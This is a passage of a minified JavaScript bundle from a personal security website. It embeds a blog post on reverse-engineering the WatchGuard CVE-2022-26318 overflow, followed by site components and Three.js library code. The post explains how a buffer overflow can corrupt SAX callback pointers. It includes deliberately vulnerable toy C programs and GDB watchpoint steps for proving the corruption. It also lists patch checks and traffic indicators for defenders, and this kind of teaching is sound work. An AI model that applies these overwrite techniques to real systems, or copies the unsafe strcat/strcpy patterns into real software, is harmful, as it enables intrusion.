    <h2>5) Understanding the parser mechanics (SAX2) like an expert</h2>
    <p>If you want to be complete-expert level, you need to understand what libxml2 will call, when, and with what data.</p>
    <h3>5.1 SAX = “stream of events”</h3>
    <p>SAX parsers don’t build a full DOM by default. They call callbacks like <code>startDocument</code>, <code>startElementNs</code>, <code>characters</code>, <code>endElementNs</code>.</p>
    <h3>5.2 SAX2 magic: validating you found the real handler</h3>
    <p>libxml2 defines a constant often used in SAX2 blocks: <code>XML_SAX2_MAGIC</code> (<code>0xDEEDBEAF</code>). Searching for this value in the binary helps confirm you’re looking at SAX2 handler structures.</p>
    <hr />
    <h2>6) Heap layout + function pointer overwrite (how researchers prove control-relevant corruption)</h2>
    <p>This is the “Aha” section: buffer overflow is only interesting when it reaches something that changes control-flow, like a function pointer table.</p>
    <h3>6.1 Why callback tables are high-value overwrite targets</h3>
    <p>A SAX handler is data fields plus <strong>function pointers</strong>. If you corrupt a callback pointer, the next SAX event dispatch can call attacker-influenced memory.</p>
    <h3>6.2 The single best technique: watchpoints</h3>
    <p>A single hardware watchpoint turns “I think it overwrites X” into “here is the exact instruction that did it.”</p>
    <hr />
    <h2>7) Dynamic RE: proving the overwrite with GDB (non-weaponized workflow)</h2>
    <blockquote>
      <p>You may run this either inside a lab VM/container with extracted binaries, or via QEMU user-mode for convenience (architecture permitting).</p>
    </blockquote>
    <h3>7.1 Pick a stop point before parsing</h3>
    <p>Set a breakpoint at the function that feeds bytes into the parser (often the caller of <code>xmlParseChunk</code>).</p>
    <h3>7.2 Find the handler pointer in memory</h3>
    <p>Once you identify where the handler struct lives (stack or heap), print its address and locate key fields like <code>startElementNs</code>. Then set a watchpoint on that pointer.</p>
    <pre><code class="language-gdb">watch *(void**)startElementNs_ptr_address
continue</code></pre>
    <p>When the overflow corrupts the callback, GDB breaks at the exact write site. That is the cleanest proof that corruption reaches control-flow.</p>
    <hr />
    <h2>8) Safe code snippets: understand the bug pattern without weaponizing</h2>
    <h3>8.1 Toy example: “XPath-like string growth + strcat overflow”</h3>
    <p>This is <strong>not WatchGuard code</strong>; it just mirrors the bug shape in a harmless harness.</p>
    <pre><code class="language-c">// toy_xpath_overflow.c (educational pattern)
// Shows how repeated strcat without bounds checks can overflow a path buffer.

#include &lt;stdio.h&gt;
#include &lt;string.h&gt;

int main(void) {
  char path[64];
  memset(path, 0, sizeof(path));
  strcpy(path, "/root");

  // Simulate deep XML nesting with long tag names.
  const char *tags[] = {
    "aaaaaaaaaaaaaaaa", "bbbbbbbbbbbbbbbb", "cccccccccccccccc", "dddddddddddddddd"
  };

  for (int i = 0; i &lt; 4; i++) {
    strcat(path, "/");          // unsafe
    strcat(path, tags[i]);      // unsafe
  }

  printf("path=%s\\n", path);
  return 0;
}</code></pre>
    <p><strong>How to learn from it defensively</strong></p>
    <ul>
      <li>Compile with sanitizers (ASan) to see the overflow precisely:
        <ul>
          <li><code>clang -O0 -g -fsanitize=address -fno-omit-frame-pointer toy_xpath_overflow.c -o toy</code></li>
        </ul>
      </li>
      <li>Run it and observe the diagnostic.</li>
    </ul>
    <h3>8.2 Toy example: “overflow → function pointer corruption” + watchpoint</h3>
    <pre><code class="language-c">// watchpoint_lab.c (educational toy)
// Overflows a buffer adjacent to a function pointer.

#include &lt;stdio.h&gt;
#include &lt;string.h&gt;

typedef void (*cb_t)(void);

typedef struct {
  char buf[32];
  cb_t cb;
} Handler;

static void legit(void) { puts("[+] legit callback"); }

int main(void) {
  Handler h;
  memset(&amp;h, 0, sizeof(h));
  h.cb = legit;

  // Overflow buf into cb (educational only)
  strcpy(h.buf, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA");

  // May crash or behave unexpectedly if cb is corrupted
  h.cb();
  return 0;
}</code></pre>
    <p>In GDB:</p>
    <pre><code class="language-gdb">b main
run
next     # step until after h.cb is assigned
p &amp;h.cb
watch *(void**)&amp;h.cb
c</code></pre>
    <p>You’ll break at the exact write that changes <code>h.cb</code>. That’s the same method used to prove control-relevant corruption in real targets.</p>
    <hr />
    <h2>9) Patch verification: how to confirm the fix (without source code)</h2>
    <p>Once you have both a vulnerable build (e.g., &lt;= 12.7.2_Update1) and a fixed build (12.7.2_Update2), you can validate remediation as a reverse engineer.</p>
    <h3>9.1 Behavior-based confirmation</h3>
    <ul>
      <li>The same malformed input that crashed/parses weirdly in the vulnerable build should fail parsing safely or return an error without corrupting memory.</li>
    </ul>
    <h3>9.2 Binary-diff confirmation (what to look for)</h3>
    <ul>
      <li>replacing <code>strcat</code>/<code>strcpy</code> with bounded variants (or explicit length checks)</li>
      <li>switching to <code>snprintf</code> with remaining buffer calculation</li>
      <li>tracking max path length and rejecting over-deep nesting</li>
    </ul>
    <p>Release notes explicitly list the vulnerability as resolved in Update 2; the PSIRT advisory lists resolved versions across branches.</p>
    <hr />
    <h2>10) Detection &amp; mitigation (what you do as a defender)</h2>
    <h3>10.1 Patch</h3>
    <p>Apply WatchGuard’s fixed versions for your branch (see PSIRT advisory).</p>
    <h3>10.2 Reduce attack surface</h3>
    <ul>
      <li>Ensure management interfaces are not internet-exposed.</li>
      <li>Restrict to trusted admin networks (WatchGuard explicitly recommends restricting management access).</li>
    </ul>
    <h3>10.3 Look for suspicious traffic patterns</h3>
    <ul>
      <li>Inbound TLS connections to port <strong>4117</strong></li>
      <li><code>POST /agent/login</code></li>
      <li><code>Content-Encoding: gzip</code> and larger-than-usual request sizes in observed attempts</li>
    </ul>
    <h3>10.4 Why this belongs in “KEV thinking”</h3>
    <p>NVD includes CISA’s “Known Exploited Vulnerabilities” metadata (date added and due date) for CVE-2022-26318.</p>
    <hr />
    <h2>11) Lessons learned (the “expert takeaways”)</h2>
    <ol>
      <li><strong>Don’t build unbounded strings from attacker-controlled structure.</strong> SAX parsing creates a natural growth vector (deep nesting) that attackers can exploit.</li>
      <li><strong>Callback tables are control-flow gold.</strong> If you store function pointers near variable-length buffers, you’ve created a corruption-to-control bridge.</li>
      <li><strong>Watchpoints beat guesswork.</strong> A single watchpoint can turn “I think it overwrites X” into “here is the exact instruction that did it.”</li>
      <li><strong>Vendor advisories + wire intel + RE = complete picture.</strong></li>
    </ol>
    <p>Reverse-engineering this bug responsibly gives defenders a blueprint to harden management planes, validate firmware fixes, and detect exploit traffic early.</p>
  </div>
</body>
</html>
`,xb={firmware_llm_annotator:{title:"Firmware Exploration: LLM as Your Annotator",slug:"firmware_llm_annotator",content:db},transient_scheduler_attacks_tsa_blog:{title:"Transient Scheduler Attacks on CPUs: Exploiting AMD’s New Microarchitectural Leak",slug:"transient_scheduler_attacks_tsa_blog",content:mb},kernel_surface_audit_blog:{title:"Who Can Touch Your Kernel? Auditing /boot/vmlinuz-* on Linux",slug:"kernel_surface_audit_blog",content:vb},"cve-2022-26318-re-blog":{title:"Reverse-Engineering CVE-2022-26318 (WatchGuard Firebox/XTM): From Network Trace to Root Cause (Non-Weaponized)",slug:"cve-2022-26318-re-blog",content:_b},"react2shell-toy-lab":{title:'From React2Shell to Toy Labs: Understanding Insecure Deserialization with a Tiny "Fake Flight" Server',slug:"react2shell-toy-lab",content:gb},1001:{title:"CVE-2024–1001",slug:"1001",content:ab},"0012":{title:"CVE-2024–0012",slug:"0012",content:sb},40982:{title:"CVE-2022–40982",slug:"40982",content:cb},cow:{title:"CVE-2016–5195",slug:"cow",content:ub},symlinks:{title:"Symbolic Links (Symlinks) in Linux",slug:"symlinks",content:fb},23397:{title:"CVE-2023–23397",slug:"23397",content:lb},"0160":{title:"CVE-2014-0160",slug:"0160",content:rb},11882:{title:"CVE-2017-11882",slug:"11882",content:ob},robot:{title:"ROBOT (Return of Bleichenbacher’s Oracle Threat) Attack",slug:"robot",content:hb},poodle:{title:"ZOMBIE POODLE and GOLDENDOODLE ATTACKS",slug:"poodle",content:pb}};function yb(t){try{const n=new DOMParser().parseFromString(t,"text/html"),i=["style","script","link","nav","header","footer",".navbar",".nav-container",".theme-toggle",".footer",".social-links",".social-icons"];n.querySelectorAll(i.join(",")).forEach(o=>o.remove()),n.querySelectorAll("[style]").forEach(o=>o.removeAttribute("style"));const s=n.querySelector("h1");s&&s.remove();const r=[".blog-text","article",".blog-post-content","main"];let a=n.body;for(const o of r){const l=n.querySelector(o);if(l){a=l;break}}return a.querySelectorAll(".container").forEach(o=>{for(;o.firstChild;)o.parentNode.insertBefore(o.firstChild,o);o.remove()}),Array.from(a.querySelectorAll("h2, h3")).forEach((o,l)=>{o.id||(o.id=`section-${l+1}`)}),a.innerHTML||t}catch{return t}}function Sb(){const{slug:t}=mS(),e=xb[t],n=za.find(r=>r.slug===t),i=Q.useMemo(()=>e?yb(e.content):"",[e]),s=()=>document.body.classList.contains("dark")?"dark":"light";return Q.useEffect(()=>{const r=document.querySelector(".giscus-container");if(!r)return;r.innerHTML="";const a=document.createElement("script");return a.src="https://giscus.app/client.js",a.async=!0,a.crossOrigin="anonymous",a.setAttribute("data-giscus","true"),a.setAttribute("data-repo","Hem1700/hem1700.github.io"),a.setAttribute("data-repo-id","R_kgDONilgZg"),a.setAttribute("data-category","General"),a.setAttribute("data-category-id","DIC_kwDONilgZs4CzSR2"),a.setAttribute("data-mapping","pathname"),a.setAttribute("data-strict","1"),a.setAttribute("data-reactions-enabled","1"),a.setAttribute("data-emit-metadata","0"),a.setAttribute("data-input-position","top"),a.setAttribute("data-lang","en"),a.setAttribute("data-theme",s()),r.appendChild(a),()=>{r.innerHTML=""}},[t]),Q.useEffect(()=>{const r=()=>{var l;const o=document.querySelector("iframe.giscus-frame");o&&((l=o.contentWindow)==null||l.postMessage({giscus:{setConfig:{theme:s()}}},"https://giscus.app"))},a=new MutationObserver(r);return a.observe(document.body,{attributes:!0,attributeFilter:["class"]}),r(),()=>a.disconnect()},[]),e?S.jsxs(S.Fragment,{children:[S.jsx("header",{className:"blog-post-header",children:S.jsxs("div",{className:"container text-center",children:[S.jsx("h1",{className:"blog-post-title",children:e.title}),n&&S.jsxs("p",{className:"blog-post-date",children:[n.date," · ",n.readTime]})]})}),S.jsxs("main",{className:"section blog-post-content container",children:[S.jsx("article",{dangerouslySetInnerHTML:{__html:i}}),S.jsx("section",{className:"comments",children:S.jsx("div",{className:"container",children:S.jsx("div",{className:"giscus-container"})})})]})]}):S.jsxs("main",{className:"section blog-post-content container",children:[S.jsx("h2",{children:"Post not found"}),S.jsx("p",{children:"Signal lost. Let’s go back."}),S.jsx(Ft,{to:"/blogs",className:"view-credentials",children:"Back to Blog"})]})}function bb(){return S.jsx("section",{className:"section",children:S.jsxs("div",{className:"container",children:[S.jsx("div",{className:"section-header",children:S.jsxs("div",{children:[S.jsx("div",{className:"eyebrow",children:"Featured work"}),S.jsx("h2",{className:"section-title",children:"Projects"}),S.jsx("p",{className:"section-subtitle",children:"Deployment dossiers and offensive prototypes."})]})}),S.jsx(S0,{items:g0,showHeader:!1,showViewAll:!1,showFilters:!0,showFeatured:!0,wrap:!1})]})})}function wb(){return S.jsx("section",{className:"section",children:S.jsxs("div",{className:"container",children:[S.jsx("div",{className:"section-header",children:S.jsxs("div",{children:[S.jsx("div",{className:"eyebrow",children:"Recognitions"}),S.jsx("h2",{className:"section-title",children:"Certifications"}),S.jsx("p",{className:"section-subtitle",children:"Professional credentials across security, cloud, and networking."})]})}),S.jsx(y0,{items:v0,showHeader:!1,wrap:!1})]})})}const Wn=5,gr=Array.from({length:Wn},(t,e)=>String.fromCharCode(65+e)),Eb=new Set(["reverse","engineering","from","with","into","watchguard","firebox","kernel","linux","audit","transient","scheduler","attacks","understanding","cve","blog","server","tiny","fake"]),Wf=()=>{const t={};for(let e=1;e<=Wn;e+=1)for(let n=0;n<Wn;n+=1){const i=`${gr[n]}${e}`;t[i]={status:"unknown",heat:""}}return t},Mb=t=>{const i=(t||"").toLowerCase().replace(/[^a-z0-9\s]/g," ").split(/\s+/).filter(Boolean).find(s=>s.length>4&&!Eb.has(s));return i?i.toUpperCase():"SIGNAL"},jf=t=>{const e=t.length?t[Math.floor(Math.random()*t.length)]:{id:"UNKNOWN",title:"Unknown intruder",year:"Unknown",severity:"Unknown",summary:"",href:""},n=Math.floor(Math.random()*Wn),i=Math.floor(Math.random()*Wn);return{entry:e,colIndex:n,rowIndex:i,key:`${gr[n]}${i+1}`}},Tb=t=>t===0?{label:"direct",text:"Direct signal. Confirm with ISOLATE."}:t<=1?{label:"hot",text:"Signal spike detected."}:t<=2?{label:"warm",text:"Signal is warm."}:t<=3?{label:"cool",text:"Signal is faint."}:{label:"cold",text:"Signal cold."},Ic=()=>[{type:"system",text:"NODE HUNT // Threat hunting console online."},{type:"system",text:"Type HELP to see commands."},{type:"info",text:`Grid ${Wn}x${Wn} loaded. Signal drift detected.`}];function Ab({entries:t=[]}){var G,V,Z;const[e,n]=Q.useState(()=>Wf()),[i,s]=Q.useState(()=>jf(t)),[r,a]=Q.useState(()=>Ic()),[o,l]=Q.useState(""),[c,p]=Q.useState(0),[d,h]=Q.useState(0),[f,v]=Q.useState("active"),y=Q.useRef(null),m=Q.useMemo(()=>{var O,z,F,I;return{year:((O=i.entry)==null?void 0:O.year)||"Unknown",severity:((z=i.entry)==null?void 0:z.severity)||"Unknown",keyword:Mb(`${((F=i.entry)==null?void 0:F.title)||""} ${((I=i.entry)==null?void 0:I.summary)||""}`)}},[i]);Q.useEffect(()=>{y.current&&(y.current.scrollTop=y.current.scrollHeight)},[r]);const u=(O,z="info")=>{a(F=>[...F,{type:z,text:O}])},g=()=>{n(Wf()),s(jf(t)),p(0),h(0),v("active"),a([...Ic(),{type:"system",text:"New hunt initialized."}])},_=O=>{const z=O==null?void 0:O.toUpperCase().match(/^([A-Z])(\d+)$/);if(!z)return null;const F=z[1],I=Number(z[2]),X=gr.indexOf(F);return X===-1||!Number.isFinite(I)||I<1||I>Wn?null:{key:`${F}${I}`,colIndex:X,rowIndex:I-1}},b=O=>{d===0&&O>=2?(h(1),u(`Hint: Signal spikes in row ${i.rowIndex+1}.`,"hint")):d===1&&O>=4&&(h(2),u(`Hint: Signal concentrates in column ${gr[i.colIndex]}.`,"hint"))},T=()=>{const O=i.rowIndex<Wn/2?"NORTH":"SOUTH",z=i.colIndex<Wn/2?"WEST":"EAST";u(`Scan result: signal cluster in ${O}-${z} quadrant.`,"info")},A=O=>{const z=Math.abs(O.colIndex-i.colIndex)+Math.abs(O.rowIndex-i.rowIndex),F=Tb(z);n(I=>({...I,[O.key]:{status:"ping",heat:F.label}})),u(`Ping ${O.key}: ${F.text}`,"info")},C=O=>{const z=i.rowIndex===O.rowIndex?"SAME ROW":i.rowIndex<O.rowIndex?"NORTH":"SOUTH",F=i.colIndex===O.colIndex?"SAME COLUMN":i.colIndex<O.colIndex?"WEST":"EAST",I=z==="SAME ROW"&&F==="SAME COLUMN"?"LOCK POSSIBLE":z==="SAME ROW"?F:F==="SAME COLUMN"?z:`${z}-${F}`;n(X=>({...X,[O.key]:{status:"trace",heat:""}})),u(`Trace ${O.key}: target heading ${I}.`,"info")},L=O=>{var F;const z=c+1;if(p(z),O.key===i.key){n(I=>({...I,[O.key]:{status:"hit",heat:"hot"}})),v("found"),u(`Target isolated at ${O.key}.`,"success"),u(`Identity confirmed: ${((F=i.entry)==null?void 0:F.id)||"Unknown"}.`,"success");return}n(I=>({...I,[O.key]:{status:"miss",heat:"cold"}})),u(`Isolate ${O.key}: no match.`,"warning"),b(z)},w=O=>{var ne;const z=O.trim();if(!z)return;u(`> ${z}`,"command");const[F,I]=z.split(/\s+/),X=F.toLowerCase(),K=I||"";if(f==="found"&&!["restart","help","clear","open"].includes(X)){u("Case closed. Type RESTART to hunt again.","system");return}if(X==="help"){u("Commands: SCAN, PING A1, TRACE B2, ISOLATE C3, OPEN, CLEAR, RESTART.","system");return}if(X==="scan"){T();return}if(X==="clear"){a([...Ic(),{type:"system",text:"Console cleared."}]);return}if(X==="restart"){g();return}if(X==="open"){if(f!=="found"||!((ne=i.entry)!=null&&ne.href)){u("No report unlocked yet.","warning");return}window.open(i.entry.href,"_blank","noreferrer"),u("Opening report in new tab.","system");return}if(["ping","trace","isolate"].includes(X)){const ye=_(K);if(!ye){u("Invalid coordinate. Example: PING B2.","error");return}X==="ping"&&A(ye),X==="trace"&&C(ye),X==="isolate"&&L(ye);return}u("Unknown command. Type HELP.","error")},E=O=>{O.preventDefault(),w(o),l("")},P=O=>O.status==="hit"?"@":O.status==="miss"?"x":O.status==="trace"?"+":O.status==="ping"?"o":".";return S.jsxs("div",{className:"hunt-layout",children:[S.jsxs("div",{className:"hunt-terminal",children:[S.jsxs("div",{className:"terminal-header",children:[S.jsxs("div",{children:[S.jsx("div",{className:"terminal-title",children:"NODE HUNT"}),S.jsx("div",{className:"terminal-subtitle",children:"Threat hunting simulation"})]}),S.jsx("div",{className:`terminal-status ${f}`,children:f==="found"?"SECURED":"ACTIVE"})]}),S.jsxs("div",{className:"hunt-onboarding",children:[S.jsx("div",{className:"onboarding-title",children:"How to play"}),S.jsxs("div",{className:"onboarding-steps",children:[S.jsx("div",{children:"1. SCAN to get the quadrant."}),S.jsx("div",{children:"2. PING A1 for heat distance."}),S.jsx("div",{children:"3. TRACE B2 for direction."}),S.jsx("div",{children:"4. ISOLATE when you are confident."})]}),S.jsx("div",{className:"onboarding-hint",children:"Try: SCAN, PING B2, TRACE C4, ISOLATE D5."})]}),S.jsx("div",{className:"terminal-log",ref:y,children:r.map((O,z)=>S.jsx("div",{className:`terminal-line ${O.type}`,children:O.text},`${O.type}-${z}`))}),S.jsxs("form",{className:"terminal-input",onSubmit:E,children:[S.jsx("span",{className:"terminal-prompt",children:"nodehunt>"}),S.jsx("input",{type:"text",value:o,onChange:O=>l(O.target.value),placeholder:"Type a command (HELP)","aria-label":"Terminal command"}),S.jsx("button",{className:"pill",type:"submit",children:"Run"})]})]}),S.jsxs("div",{className:"hunt-board",children:[S.jsxs("div",{className:"hunt-intel",children:[S.jsx("div",{className:"intel-title",children:"Signal fingerprint"}),S.jsxs("div",{className:"intel-row",children:[S.jsx("span",{children:"Year"}),S.jsx("span",{children:m.year})]}),S.jsxs("div",{className:"intel-row",children:[S.jsx("span",{children:"Severity"}),S.jsx("span",{children:m.severity})]}),S.jsxs("div",{className:"intel-row",children:[S.jsx("span",{children:"Codename"}),S.jsx("span",{children:m.keyword})]}),S.jsxs("div",{className:"intel-row",children:[S.jsx("span",{children:"Attempts"}),S.jsx("span",{children:c})]})]}),S.jsxs("div",{className:"hunt-grid",children:[S.jsxs("div",{className:"grid-row",children:[S.jsx("div",{className:"grid-cell header"}),gr.map(O=>S.jsx("div",{className:"grid-cell header",children:O},O))]}),Array.from({length:Wn}).map((O,z)=>S.jsxs("div",{className:"grid-row",children:[S.jsx("div",{className:"grid-cell header",children:z+1}),gr.map(F=>{const I=`${F}${z+1}`,X=e[I],K=X.heat?`heat-${X.heat}`:"";return S.jsx("div",{className:`grid-cell cell ${X.status} ${K}`,children:P(X)},I)})]},`row-${z}`))]}),S.jsxs("div",{className:"hunt-legend",children:[S.jsxs("div",{children:[S.jsx("span",{className:"legend-symbol",children:"."})," unknown"]}),S.jsxs("div",{children:[S.jsx("span",{className:"legend-symbol",children:"o"})," ping"]}),S.jsxs("div",{children:[S.jsx("span",{className:"legend-symbol",children:"+"})," trace"]}),S.jsxs("div",{children:[S.jsx("span",{className:"legend-symbol",children:"x"})," miss"]}),S.jsxs("div",{children:[S.jsx("span",{className:"legend-symbol",children:"@"})," capture"]})]}),f==="found"&&S.jsxs("div",{className:"hunt-result",children:[S.jsx("div",{className:"hunt-result-title",children:"Intruder identified"}),S.jsx("div",{className:"hunt-result-id",children:((G=i.entry)==null?void 0:G.id)||"Unknown"}),S.jsx("p",{className:"hunt-result-text",children:(V=i.entry)==null?void 0:V.title}),((Z=i.entry)==null?void 0:Z.href)&&S.jsx("a",{className:"button primary",href:i.entry.href,target:"_blank",rel:"noreferrer",children:"Open report"})]})]})]})}function Cb(){const t=Q.useMemo(()=>{const e=r=>r.toUpperCase().includes("CVE"),n=r=>{if(!r)return"Unknown";const o=new Date(r).getFullYear();return Number.isFinite(o)?String(o):"Unknown"},i=r=>{const o=((r||"").match(/\d/g)||[]).reduce((c,p)=>c+Number(p),0),l=["Low","Medium","High","Critical"];return l[o%l.length]},s=r=>r==="Critical"?9.4:r==="High"?8.1:r==="Medium"?6:4;return za.filter(r=>e(r.title)).map(r=>{const a=r.title.match(/CVE[-–](\d{4})[-–]?([\d]+)/i),o=a?`CVE-${a[1]}-${a[2]}`:r.slug.toUpperCase(),l=i(o);return{id:o,title:r.title,severity:l,cvss:s(l),year:n(r.date),kev:!1,summary:r.excerpt,href:r.href||`/blog/${r.slug}`}})},[]);return S.jsx("section",{className:"section",children:S.jsxs("div",{className:"container",children:[S.jsx("div",{className:"section-header",children:S.jsxs("div",{children:[S.jsx("div",{className:"eyebrow",children:"CVE map"}),S.jsx("h2",{className:"section-title",children:"Node Hunt"}),S.jsx("p",{className:"section-subtitle",children:"Track the intruder through the grid. Ping, trace, and isolate the target."})]})}),S.jsx("div",{className:"cve-hunt-shell",children:S.jsx(Ab,{entries:t})})]})})}function Rb(){const t="hemparekh1596@gmail.com",[e,n]=Q.useState(!1),i=()=>{navigator.clipboard&&navigator.clipboard.writeText(t).then(()=>{n(!0),setTimeout(()=>n(!1),1800)}).catch(()=>{})};return S.jsx("section",{className:"contact-strip",id:"contact",children:S.jsxs("div",{className:"container contact-grid",children:[S.jsxs("div",{children:[S.jsx("div",{className:"eyebrow",children:"Lets talk"}),S.jsx("h2",{className:"section-title",children:"Signal received. Lets build secure systems."}),S.jsx("p",{className:"contact-blurb",children:"Ready to collaborate on security engineering, privacy, or threat research? Drop a note and we will map the next move."}),e&&S.jsx("p",{className:"contact-blurb",children:"Copied. Channel armed with end-to-end noise."})]}),S.jsxs("div",{className:"contact-actions",children:[S.jsx("button",{className:"button primary",onClick:i,type:"button",children:"Copy Email"}),S.jsx("a",{className:"button ghost",href:"https://www.linkedin.com/in/hem-parekh/",target:"_blank",rel:"noreferrer",children:"LinkedIn"}),S.jsx("a",{className:"button ghost",href:"https://github.com/Hem1700",target:"_blank",rel:"noreferrer",children:"GitHub"})]})]})})}function Pb(){const[t,e]=Q.useState(0);return Q.useEffect(()=>{const n=()=>{const{scrollTop:i,scrollHeight:s,clientHeight:r}=document.documentElement,a=s>r?i/(s-r)*100:0;e(Math.min(100,Math.max(0,a)))};return n(),window.addEventListener("scroll",n,{passive:!0}),()=>window.removeEventListener("scroll",n)},[]),S.jsx("div",{className:"scroll-indicator","aria-hidden":"true",children:S.jsx("div",{className:"scroll-indicator__bar",style:{height:`${t}%`}})})}function kb(){const[t,e]=Q.useState(!1);return Q.useEffect(()=>{const n=()=>e(window.scrollY>400);return window.addEventListener("scroll",n,{passive:!0}),n(),()=>window.removeEventListener("scroll",n)},[]),t?S.jsx("button",{className:"back-to-top",type:"button","aria-label":"Back to top",title:"Back to top",onClick:()=>window.scrollTo({top:0,behavior:"smooth"}),children:"↑"}):null}function Lb(){const t=Q.useRef(null);return Q.useEffect(()=>{const e=t.current;if(!e)return()=>{};let n=0,i=0,s=null;const r=o=>{n=o.clientX,i=o.clientY},a=()=>{e.style.transform=`translate(${n}px, ${i}px) translate(-50%, -50%)`,s=requestAnimationFrame(a)};return window.addEventListener("mousemove",r),a(),()=>{window.removeEventListener("mousemove",r),s&&cancelAnimationFrame(s)}},[]),S.jsx("div",{className:"cursor-w","aria-hidden":"true",children:S.jsx("div",{ref:t,className:"cursor-dot"})})}/**
 * @license
 * Copyright 2010-2025 Three.js Authors
 * SPDX-License-Identifier: MIT
 */const Qp="182",Nb=0,Xf=1,Ib=2,nl=1,Db=2,ca=3,ls=0,hn=1,yi=2,Mi=0,wr=1,qf=2,Yf=3,$f=4,Ub=5,Es=100,Ob=101,Fb=102,Bb=103,zb=104,Vb=200,Hb=201,Gb=202,Wb=203,cd=204,ud=205,jb=206,Xb=207,qb=208,Yb=209,$b=210,Kb=211,Zb=212,Jb=213,Qb=214,dd=0,pd=1,hd=2,Lr=3,fd=4,md=5,gd=6,vd=7,b0=0,ew=1,tw=2,ai=0,w0=1,E0=2,M0=3,T0=4,A0=5,C0=6,R0=7,P0=300,Fs=301,Nr=302,_d=303,xd=304,ec=306,Va=1e3,wi=1001,yd=1002,Bt=1003,nw=1004,Eo=1005,qt=1006,Dc=1007,Rs=1008,yn=1009,k0=1010,L0=1011,Ha=1012,eh=1013,ci=1014,ni=1015,ki=1016,th=1017,nh=1018,Ga=1020,N0=35902,I0=35899,D0=1021,U0=1022,jn=1023,Li=1026,Ps=1027,O0=1028,ih=1029,Ir=1030,sh=1031,rh=1033,il=33776,sl=33777,rl=33778,al=33779,Sd=35840,bd=35841,wd=35842,Ed=35843,Md=36196,Td=37492,Ad=37496,Cd=37488,Rd=37489,Pd=37490,kd=37491,Ld=37808,Nd=37809,Id=37810,Dd=37811,Ud=37812,Od=37813,Fd=37814,Bd=37815,zd=37816,Vd=37817,Hd=37818,Gd=37819,Wd=37820,jd=37821,Xd=36492,qd=36494,Yd=36495,$d=36283,Kd=36284,Zd=36285,Jd=36286,iw=3200,F0=0,sw=1,Xi="",Cn="srgb",Dr="srgb-linear",Nl="linear",it="srgb",Ws=7680,Kf=519,rw=512,aw=513,ow=514,ah=515,lw=516,cw=517,oh=518,uw=519,Zf=35044,Jf="300 es",ii=2e3,Il=2001;function B0(t){for(let e=t.length-1;e>=0;--e)if(t[e]>=65535)return!0;return!1}function Dl(t){return document.createElementNS("http://www.w3.org/1999/xhtml",t)}function dw(){const t=Dl("canvas");return t.style.display="block",t}const Qf={};function em(...t){const e="THREE."+t.shift();console.log(e,...t)}function Ie(...t){const e="THREE."+t.shift();console.warn(e,...t)}function $e(...t){const e="THREE."+t.shift();console.error(e,...t)}function Wa(...t){const e=t.join(" ");e in Qf||(Qf[e]=!0,Ie(...t))}function pw(t,e,n){return new Promise(function(i,s){function r(){switch(t.clientWaitSync(e,t.SYNC_FLUSH_COMMANDS_BIT,0)){case t.WAIT_FAILED:s();break;case t.TIMEOUT_EXPIRED:setTimeout(r,n);break;default:i()}}setTimeout(r,n)})}class Vr{addEventListener(e,n){this._listeners===void 0&&(this._listeners={});const i=this._listeners;i[e]===void 0&&(i[e]=[]),i[e].indexOf(n)===-1&&i[e].push(n)}hasEventListener(e,n){const i=this._listeners;return i===void 0?!1:i[e]!==void 0&&i[e].indexOf(n)!==-1}removeEventListener(e,n){const i=this._listeners;if(i===void 0)return;const s=i[e];if(s!==void 0){const r=s.indexOf(n);r!==-1&&s.splice(r,1)}}dispatchEvent(e){const n=this._listeners;if(n===void 0)return;const i=n[e.type];if(i!==void 0){e.target=this;const s=i.slice(0);for(let r=0,a=s.length;r<a;r++)s[r].call(this,e);e.target=null}}}const Wt=["00","01","02","03","04","05","06","07","08","09","0a","0b","0c","0d","0e","0f","10","11","12","13","14","15","16","17","18","19","1a","1b","1c","1d","1e","1f","20","21","22","23","24","25","26","27","28","29","2a","2b","2c","2d","2e","2f","30","31","32","33","34","35","36","37","38","39","3a","3b","3c","3d","3e","3f","40","41","42","43","44","45","46","47","48","49","4a","4b","4c","4d","4e","4f","50","51","52","53","54","55","56","57","58","59","5a","5b","5c","5d","5e","5f","60","61","62","63","64","65","66","67","68","69","6a","6b","6c","6d","6e","6f","70","71","72","73","74","75","76","77","78","79","7a","7b","7c","7d","7e","7f","80","81","82","83","84","85","86","87","88","89","8a","8b","8c","8d","8e","8f","90","91","92","93","94","95","96","97","98","99","9a","9b","9c","9d","9e","9f","a0","a1","a2","a3","a4","a5","a6","a7","a8","a9","aa","ab","ac","ad","ae","af","b0","b1","b2","b3","b4","b5","b6","b7","b8","b9","ba","bb","bc","bd","be","bf","c0","c1","c2","c3","c4","c5","c6","c7","c8","c9","ca","cb","cc","cd","ce","cf","d0","d1","d2","d3","d4","d5","d6","d7","d8","d9","da","db","dc","dd","de","df","e0","e1","e2","e3","e4","e5","e6","e7","e8","e9","ea","eb","ec","ed","ee","ef","f0","f1","f2","f3","f4","f5","f6","f7","f8","f9","fa","fb","fc","fd","fe","ff"],Uc=Math.PI/180,Qd=180/Math.PI;function Qa(){const t=Math.random()*4294967295|0,e=Math.random()*4294967295|0,n=Math.random()*4294967295|0,i=Math.random()*4294967295|0;return(Wt[t&255]+Wt[t>>8&255]+Wt[t>>16&255]+Wt[t>>24&255]+"-"+Wt[e&255]+Wt[e>>8&255]+"-"+Wt[e>>16&15|64]+Wt[e>>24&255]+"-"+Wt[n&63|128]+Wt[n>>8&255]+"-"+Wt[n>>16&255]+Wt[n>>24&255]+Wt[i&255]+Wt[i>>8&255]+Wt[i>>16&255]+Wt[i>>24&255]).toLowerCase()}function He(t,e,n){return Math.max(e,Math.min(n,t))}function hw(t,e){return(t%e+e)%e}function Oc(t,e,n){return(1-n)*t+n*e}function Jr(t,e){switch(e.constructor){case Float32Array:return t;case Uint32Array:return t/4294967295;case Uint16Array:return t/65535;case Uint8Array:return t/255;case Int32Array:return Math.max(t/2147483647,-1);case Int16Array:return Math.max(t/32767,-1);case Int8Array:return Math.max(t/127,-1);default:throw new Error("Invalid component type.")}}function on(t,e){switch(e.constructor){case Float32Array:return t;case Uint32Array:return Math.round(t*4294967295);case Uint16Array:return Math.round(t*65535);case Uint8Array:return Math.round(t*255);case Int32Array:return Math.round(t*2147483647);case Int16Array:return Math.round(t*32767);case Int8Array:return Math.round(t*127);default:throw new Error("Invalid component type.")}}class Ze{constructor(e=0,n=0){Ze.prototype.isVector2=!0,this.x=e,this.y=n}get width(){return this.x}set width(e){this.x=e}get height(){return this.y}set height(e){this.y=e}set(e,n){return this.x=e,this.y=n,this}setScalar(e){return this.x=e,this.y=e,this}setX(e){return this.x=e,this}setY(e){return 